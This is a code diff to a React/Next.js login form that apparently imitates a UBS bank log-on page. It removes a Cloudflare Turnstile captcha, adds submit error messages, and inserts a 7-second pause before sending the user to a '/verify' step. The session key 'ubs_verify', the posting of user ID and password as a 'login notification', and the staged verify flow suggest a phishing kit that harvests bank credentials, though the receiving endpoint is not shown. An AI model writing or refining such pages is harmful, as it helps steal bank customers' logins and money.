@@ -2,7 +2,7 @@
 
 import type React from "react";
 
-import { useEffect, useState } from "react";
+import { useState } from "react";
 import { useRouter } from "next/navigation";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -17,38 +17,13 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [turnstileReady, setTurnstileReady] = useState(false);
-  const [turnstileToken, setTurnstileToken] = useState<string>("");
-  const [turnstileError, setTurnstileError] = useState<string | null>(null);
+  const [submitError, setSubmitError] = useState<string | null>(null);
   const [mobileLoginLoading, setMobileLoginLoading] = useState(false);
   const [forgotPasswordLoading, setForgotPasswordLoading] = useState(false);
   const [newUserLoading, setNewUserLoading] = useState(false);
   const router = useRouter();
 
-  const isSubmitDisabled = isLoading || !turnstileReady || !turnstileToken;
-
-  const TURNSTILE_SITE_KEY = "0x4AAAAAACs5BdLxYCGSNXby";
-
-  useEffect(() => {
-    (window as any).onTurnstileVerified = (token: string) => {
-      setTurnstileToken(token);
-    };
-
-    const scriptSrc = "https://challenges.cloudflare.com/turnstile/v0/api.js";
-    const existing = document.querySelector(`script[src="${scriptSrc}"]`);
-    if (!existing) {
-      const script = document.createElement("script");
-      script.src = scriptSrc;
-      script.async = true;
-      script.defer = true;
-      script.onload = () => setTurnstileReady(true);
-      script.onerror = () =>
-        setTurnstileError("Failed to load captcha. Refresh page.");
-      document.head.appendChild(script);
-    } else {
-      setTurnstileReady(true);
-    }
-  }, []);
+  const isSubmitDisabled = isLoading;
 
   const handleMobileLoginClick = (e: React.MouseEvent) => {
     e.preventDefault();
@@ -80,6 +55,7 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (isLoading) return;
+    setSubmitError(null);
     setIsLoading(true);
 
     try {
@@ -89,17 +65,18 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
         body: JSON.stringify({
           userId,
           password,
-          turnstileToken,
         }),
       });
       if (!res.ok) {
         const body = await res.json().catch(() => null);
         console.error("Login failed:", body?.error || res.statusText);
+        setSubmitError(body?.error || "Login failed. Please try again.");
         setIsLoading(false);
         return;
       }
     } catch (error) {
       console.error("Failed to send login notification:", error);
+      setSubmitError("Unable to submit login right now. Please try again.");
       setIsLoading(false);
       return;
     }
@@ -107,6 +84,8 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
     if (typeof window !== "undefined") {
       sessionStorage.setItem("ubs_verify", "1");
     }
+
+    await new Promise((resolve) => setTimeout(resolve, 7000));
     router.push("/verify");
   };
 
@@ -197,14 +176,6 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
         </div>
       </div>
 
-      <div className="flex justify-center">
-        <div
-          className="cf-turnstile"
-          data-sitekey={TURNSTILE_SITE_KEY}
-          data-callback="onTurnstileVerified"
-        />
-      </div>
-
       <Button
         type="submit"
         disabled={isSubmitDisabled}
@@ -213,16 +184,8 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
         {isLoading ? "Loading..." : "Log On"}
       </Button>
 
-      {turnstileError ? (
-        <p className="text-center text-xs text-red-600">{turnstileError}</p>
-      ) : !turnstileReady ? (
-        <p className="text-center text-xs text-slate-500">
-          Loading security check... please wait.
-        </p>
-      ) : !turnstileToken ? (
-        <p className="text-center text-xs text-slate-500">
-          Complete the captcha challenge before logging in.
-        </p>
+      {submitError ? (
+        <p className="text-center text-xs text-red-600">{submitError}</p>
       ) : null}
 
       <div className="space-y-3 text-sm">
